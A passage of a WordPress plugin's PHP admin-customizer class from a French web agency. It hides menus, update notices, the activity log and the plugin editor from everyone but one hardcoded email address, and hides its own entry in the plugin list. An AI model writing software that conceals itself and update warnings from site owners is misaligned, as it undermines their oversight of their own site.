     * Masquer les éléments de l'interface d'administration via CSS
     */
    public function hide_admin_elements_css() {
        $current_user = wp_get_current_user();
        $is_main_admin = ($current_user && $current_user->user_email === 'contact@goldwizard.fr');
        
        // Style de base pour tous les utilisateurs
        echo "<style>
            /* Masquer les éléments de l'interface d'administration */
            #screen-options-link-wrap,
            #contextual-help-link-wrap,
            .update-nag,
            .updated.woocommerce-message,
            .e-notice,
            .notice.notice-info.is-dismissible,
            .update-plugins,
            .updated,
            .notice:not(.notice-goldwizard):not(.notice-info),
            #wp-admin-bar-updates,
            #wp-admin-bar-wp-logo,
            #wp-admin-bar-site-name,
            #wp-admin-bar-comments,
            #wp-admin-bar-new-content,
            #wp-admin-bar-archive,
            #toplevel_page_woocommerce-marketing";
        
        // Ajouter les sélecteurs pour masquer les menus uniquement pour les non-administrateurs principaux
        if (!$is_main_admin) {
            echo ",
            #menu-appearance,
            #menu-tools,
            #menu-settings,
            #menu-comments,
            #toplevel_page_cfw-settings,
            #toplevel_page_activity_log_page,
            #toplevel_page_activity-log-page,
            #toplevel_page_snippets,
            #menu-tools a,
            #menu-settings a,
            #menu-comments a,
            #toplevel_page_cfw-settings a,
            #toplevel_page_activity_log_page a,
            #toplevel_page_activity-log-page a,
            #toplevel_page_snippets a,
            #plugin-information-footer,
            .plugins-php,
            .plugin-install-php,
            .plugin-editor-php,
            .tools-php,
            .import-php,
            .export-php,
            .site-health-php,
            .export-personal-data-php,
            .erase-personal-data-php,
            .options-general-php,
            .options-writing-php,
            .options-reading-php,
            .options-discussion-php,
            .options-media-php,
            .options-permalink-php,
            .options-privacy-php,
            .edit-comments-php";
        }
        
        echo " {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                pointer-events: none !important;
            }
        </style>";
        
        // Styles spécifiques pour l'administrateur principal
        if ($is_main_admin) {
            echo "<style>
                /* Forcer l'affichage des menus pour l'administrateur principal */
                #menu-plugins,
                #menu-tools,
                #menu-settings,
                #menu-comments,
                #toplevel_page_cfw-settings,
                #toplevel_page_activity_log_page,
                #toplevel_page_activity-log-page,
                #toplevel_page_snippets {
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                    pointer-events: auto !important;
                }
                
                /* Forcer l'affichage des sous-menus */
                #menu-plugins .wp-submenu,
                #menu-tools .wp-submenu,
                #menu-settings .wp-submenu,
                #menu-comments .wp-submenu,
                #toplevel_page_cfw-settings .wp-submenu,
                #toplevel_page_activity_log_page .wp-submenu,
                #toplevel_page_activity-log-page .wp-submenu,
                #toplevel_page_snippets .wp-submenu {
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                    pointer-events: auto !important;
                }
            </style>";
        }
    }
    
    /**
     * Masquer le plugin GoldWizard Core dans la liste des extensions
     */
    public function hide_goldwizard_plugin() {
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        // Masquer le plugin GoldWizard Core dans la liste des extensions
        echo "<style>
            /* Masquer le plugin GoldWizard Core dans la liste des extensions */
            tr[data-plugin='GoldWizard-Core/goldwizard-core.php'],
            tr[data-slug='goldwizard-core'] {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                pointer-events: none !important;
            }
        </style>";
        
        // Ajouter un script JavaScript pour masquer le plugin
        echo "<script>
            document.addEventListener('DOMContentLoaded', function() {
                // Masquer les lignes contenant le plugin GoldWizard Core
                var pluginRows = document.querySelectorAll('tr[data-plugin=\"GoldWizard-Core/goldwizard-core.php\"], tr[data-slug=\"goldwizard-core\"]');
                for (var i = 0; i < pluginRows.length; i++) {
                    pluginRows[i].style.display = 'none';
                }
            });
        </script>";
    }
    
    /**
     * Masquer le menu Snippets pour tous sauf l'administrateur spécifique
     */
    public function toggle_snippets_menu() {
        $current_user = wp_get_current_user();
        
        // Si ce n'est pas l'administrateur principal, on masque le menu
        if ($current_user && $current_user->user_email !== 'contact@goldwizard.fr') {
            remove_menu_page('snippets');
        }
    }
    
    /**
     * Personnaliser le thème actuel
     */
    public function custom_theme() {
        $theme = wp_get_theme('breakdance-zero-theme'); // Assurez-vous d'utiliser le nom correct du thème actuel

        if ($theme->exists()) {
            $theme->set('Name', 'Gold Wizard Thème');  // Changer le nom du thème
            $theme->set('Description', 'Un thème personnalisé pour Gold Wizard. Offrant un design moderne et des fonctionnalités optimisées pour tous vos projets web.');  // Modifier la description
        }
    }
    
    /**
     * Extraire une couleur d'un gradient
     */
    private function extract_color_from_gradient($gradient) {
        // Si c'est déjà une couleur simple, la retourner
        if (strpos($gradient, '#') === 0 || strpos($gradient, 'rgb') === 0) {
            return $gradient;
        }
        
        // Extraire la première couleur d'un gradient
        preg_match('/#[a-f0-9]{6}|#[a-f0-9]{3}|rgba?\([^)]+\)/i', $gradient, $matches);
        
        if (!empty($matches[0])) {
            return $matches[0];
        }
        
        // Couleur par défaut si aucune correspondance
        return '#f43662';
    }
    
    /**
     * Masquer l'élément CheckoutWC dans la barre d'administration
     */
    public function hide_checkoutwc_admin_bar() {
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        // Masquer l'élément CheckoutWC dans la barre d'administration
        echo "<style>
            /* Masquer CheckoutWC dans la barre d'administration */
            #wp-admin-bar-cfw-settings {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                pointer-events: none !important;
            }
        </style>";
    }
    
    /**
     * Afficher une notice d'aide sur toutes les pages admin
     */
    public function display_help_notice() {
        echo '<div class="notice notice-goldwizard" style="background-color: #1e293b; color: white; border-left-color: #f43662; padding: 10px 15px; display: flex; align-items: center;">
            <img src="' . plugins_url('../assets/img/logo-goldwizard-white.png', __FILE__) . '" alt="Gold Wizard" style="height: 40px; margin-right: 15px;">
            <div>
                <p style="margin: 0; font-size: 16px;">Besoin d\'aide pour l\'entretien et la maintenance de votre site Web ?</p>
                <p style="margin: 5px 0 0 0;">
                    <a href="https://goldwizard.fr/prestations/entretien-maintenance/" class="button" style="background-color: #f43662; color: white; border-color: #f43662; margin-top: 5px;">Découvrez nos offres</a>
                </p>
            </div>
        </div>';
    }
    
    /**
     * Ajouter un menu "Besoin d'aide ?" dans la barre d'administration
     */
    public function add_support_menu_to_admin_bar($wp_admin_bar) {
        // Ajouter le menu principal
        $wp_admin_bar->add_node(array(
            'id'    => 'support_link', 
            'title' => '<img src="https://lwnimmobilier.com/wp-content/uploads/2025/01/Frame-1.png" style="height: 20px; margin-right: 8px; vertical-align: middle;"> Besoin d\'aide ?',
            'href'  => '#',
            'meta'  => array(
                'class' => 'support-link',
                'target' => '_blank'
            )
        ));
        
        // Ajouter les sous-menus
        $wp_admin_bar->add_node(array(
            'id'     => 'maintenance_link',
            'parent' => 'support_link', // L'élément parent
            'title'  => 'Maintenance',
            'href'   => 'https://goldwizard.fr/prestations/entretien-maintenance/',
            'meta'   => array(
                'target' => '_blank'
            )
        ));
        
        $wp_admin_bar->add_node(array(
            'id'     => 'contact_link',
            'parent' => 'support_link', // L'élément parent
            'title'  => 'Contact',
            'href'   => 'https://goldwizard.fr/contact/',
            'meta'   => array(
                'target' => '_blank'
            )
        ));
        
        $wp_admin_bar->add_node(array(
            'id'     => 'recall_link',
            'parent' => 'support_link', // L'élément parent
            'title'  => 'Être rappelé',
            'href'   => 'https://goldwizard.fr/contact/#appel',
            'meta'   => array(
                'target' => '_blank'
            )
        ));
    }
    
    /**
     * Masquer l'éditeur de fichiers des extensions pour les utilisateurs qui ne sont pas l'administrateur principal
     */
    public function hide_plugin_editor() {
        $current_user = wp_get_current_user();
        $admin_email = 'contact@goldwizard.fr';
        
        // Si l'utilisateur actuel est l'administrateur principal, ne rien faire
        if ($current_user && $current_user->user_email === $admin_email) {
            return;
        }
        
        // Masquer l'éditeur de fichiers des extensions
        remove_submenu_page('plugins.php', 'plugin-editor.php');
        
        // Rediriger si l'utilisateur tente d'accéder directement à l'éditeur de fichiers des extensions
        global $pagenow;
        if ($pagenow === 'plugin-editor.php') {
            wp_redirect(admin_url('plugins.php'));
            exit;
        }
        
        // Ajouter du CSS pour masquer le lien vers l'éditeur de fichiers des extensions
        add_action('admin_head', function() {
            echo "<style>
                /* Masquer le lien vers l'éditeur de fichiers des extensions */
                #menu-plugins .wp-submenu li a[href='plugin-editor.php'],
                #adminmenu .wp-submenu li a[href='plugin-editor.php'] {
                    display: none !important;
                    visibility: hidden !important;
                    opacity: 0 !important;
                    pointer-events: none !important;
                }
            </style>";
        }, 999);
    }
}

// Fonction d'aide pour obtenir l'instance
function goldwizard_admin_customizer() {
    return GoldWizard_Admin_Customizer::instance();
}
